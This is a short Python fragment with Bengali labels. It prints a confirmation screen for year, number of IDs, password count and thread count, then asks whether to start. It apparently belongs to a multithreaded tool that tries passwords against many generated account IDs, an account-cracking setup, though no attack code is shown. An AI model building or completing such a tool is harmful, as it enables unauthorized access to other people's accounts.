            console.print(f"\n[bold yellow]═══ কনফার্মেশন ═══[/bold yellow]")
            console.print(f"বছর      : {year}")
            console.print(f"আইডি সংখ্যা: {quantity}")
            console.print(f"পাসওয়ার্ড : {len(passwords)} টি")
            console.print(f"থ্রেড    : {threads}")
            
            confirm = console.input(f"\n[red]শুরু করবেন? (yes/no): [/red]").lower()
            if confirm != "yes":
